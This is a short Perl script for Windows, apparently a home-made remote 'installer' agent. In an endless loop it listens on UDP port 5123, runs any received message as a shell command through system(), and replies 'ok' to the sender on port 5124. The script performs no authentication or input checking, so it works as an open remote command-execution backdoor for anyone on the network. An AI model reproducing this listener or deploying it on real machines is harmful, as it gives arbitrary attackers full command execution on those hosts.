#!C:\wamp\bin\perl\bin\perl.exe
  
use warnings;     
use CGI;     
use IO::Socket;
use IO::Socket::INET;
use Win32::Registry;
use Win32::Shortcut;
use Hash::Diff qw( diff );
use File::Basename;
use File::Copy::Recursive qw(dircopy);
use File::Copy qw(copy);
use Sys::Hostname;



my (@rec,$chemin,$monPack,$dossier,$nomMachine);
	
my($sock,$socket,$newmsg, $hishost, $MAXLEN, $PORTNO,$port,$ipaddr,$peer_addr , $serverdata , $clientdata,$msg,$clientsocket,$TIMEOUT);

while(1){
		
	Installer();
	

}


sub Installer {	

#print "==============================================UDP================================================\n";

	$MAXLEN = 1024;
	$PORTNO = 5123;

	$sock = IO::Socket::INET->new(
           LocalPort => $PORTNO, 
	   Proto => 'udp') or die "socket: $@";
	   
	#print "En attente des messages UDP sur le port $PORTNO\n";

	$sock->recv($newmsg, $MAXLEN);

    ($port, $ipaddr) = sockaddr_in($sock->peername);
    
	$hishost = gethostbyaddr($ipaddr,AF_INET);
	
	$peer_addr = inet_ntoa($ipaddr);
 
	print "Server IP : $peer_addr NOM : $hishost m a dit $newmsg\n";
	

	$sock->close();

	system "$newmsg";
   
	my $sock = new IO::Socket::INET(
	PeerAddr => $peer_addr,
	PeerPort => '5124', # Port the udp server listens on
	Proto => 'udp'
	) || die "[ERROR] $!\n";
	
	print $sock "ok";
  
	$sock->close();
}